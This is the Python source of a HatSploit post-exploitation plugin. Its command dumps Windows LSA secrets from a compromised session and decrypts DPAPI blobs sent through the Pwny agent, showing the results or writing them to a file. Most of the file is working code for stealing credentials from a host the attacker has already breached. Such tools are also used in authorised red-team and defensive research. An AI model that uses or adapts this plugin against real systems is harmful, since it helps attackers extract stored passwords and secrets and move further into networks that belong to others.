"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from pex.proto.tlv import TLVPacket

from hatsploit.lib.core.plugin import Plugin

LSA_SECRETS_BASE = 32

LSA_SECRETS_DUMP = tlv_custom_tag(API_CALL_STATIC, LSA_SECRETS_BASE, API_CALL)
LSA_DPAPI_DECRYPT = tlv_custom_tag(API_CALL_STATIC, LSA_SECRETS_BASE, API_CALL + 1)

LSA_SECRETS_TYPE_NAME = tlv_custom_type(TLV_TYPE_STRING, LSA_SECRETS_BASE, API_TYPE)
LSA_SECRETS_TYPE_DATA = tlv_custom_type(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE)
LSA_DPAPI_TYPE_INPUT = tlv_custom_type(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE + 1)
LSA_DPAPI_TYPE_OUTPUT = tlv_custom_type(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE + 2)
LSA_DPAPI_TYPE_ENTROPY = tlv_custom_type(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE + 3)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "LSA Secrets Plugin",
            'Plugin': "lsa_secrets",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Dump LSA secrets or decrypt DPAPI blobs.",
        })

        self.commands = [
            Command({
                'Category': "credential",
                'Name': "lsa_secrets",
                'Description': "Dump LSA secrets or decrypt DPAPI blobs.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-d', '--dump'),
                        {
                            'help': "Dump all LSA secrets.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-D', '--dpapi'),
                        {
                            'help': "Decrypt a DPAPI blob file.",
                            'metavar': 'FILE',
                        }
                    ),
                    (
                        ('-e', '--entropy'),
                        {
                            'help': "Optional entropy file for DPAPI decryption.",
                            'metavar': 'FILE',
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': "Save decrypted output to file.",
                            'metavar': 'FILE',
                        }
                    ),
                ]
            })
        ]

    def _dump_secrets(self):
        result = self.session.send_command(
            tag=LSA_SECRETS_DUMP, plugin=self.plugin
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to dump LSA secrets (need SYSTEM?)!")
            return

        groups = result.get_tlv(TLV_TYPE_GROUP)
        if not groups:
            self.print_information("No secrets found.")
            return

        if isinstance(groups, TLVPacket):
            groups = [groups]

        headers = ("Secret Name", "Data (hex)")
        data = []

        for entry in groups:
            name = entry.get_string(LSA_SECRETS_TYPE_NAME)
            raw = entry.get_raw(LSA_SECRETS_TYPE_DATA)

            hex_data = raw.hex() if raw else "(empty)"
            if len(hex_data) > 128:
                hex_data = hex_data[:128] + "..."

            data.append((name, hex_data))

        self.print_table("LSA Secrets", headers, *data)

    def _dpapi_decrypt(self, blob_file, entropy_file, out_file):
        try:
            with open(blob_file, 'rb') as f:
                blob_data = f.read()
        except (IOError, OSError) as e:
            self.print_error("Cannot read blob file: %s" % str(e))
            return

        tlv_args = {
            LSA_DPAPI_TYPE_INPUT: blob_data,
        }

        if entropy_file:
            try:
                with open(entropy_file, 'rb') as f:
                    tlv_args[LSA_DPAPI_TYPE_ENTROPY] = f.read()
            except (IOError, OSError) as e:
                self.print_error("Cannot read entropy file: %s" % str(e))
                return

        result = self.session.send_command(
            tag=LSA_DPAPI_DECRYPT,
            plugin=self.plugin,
            args=tlv_args,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("DPAPI decryption failed!")
            return

        decrypted = result.get_raw(LSA_DPAPI_TYPE_OUTPUT)
        if not decrypted:
            self.print_error("No decrypted data returned!")
            return

        if out_file:
            with open(out_file, 'wb') as f:
                f.write(decrypted)
            self.print_information("Decrypted data saved to %s (%d bytes)." % (
                out_file, len(decrypted)))
        else:
            self.print_information("Decrypted data (%d bytes):" % len(decrypted))
            try:
                text = decrypted.decode('utf-8', errors='replace')
                self.print_information(text)
            except Exception:
                self.print_information(decrypted.hex())

    def lsa_secrets(self, args):
        if args.dump:
            self._dump_secrets()
        elif args.dpapi:
            self._dpapi_decrypt(args.dpapi, args.entropy, args.output)
        else:
            self.print_usage()

    def load(self):
        pass
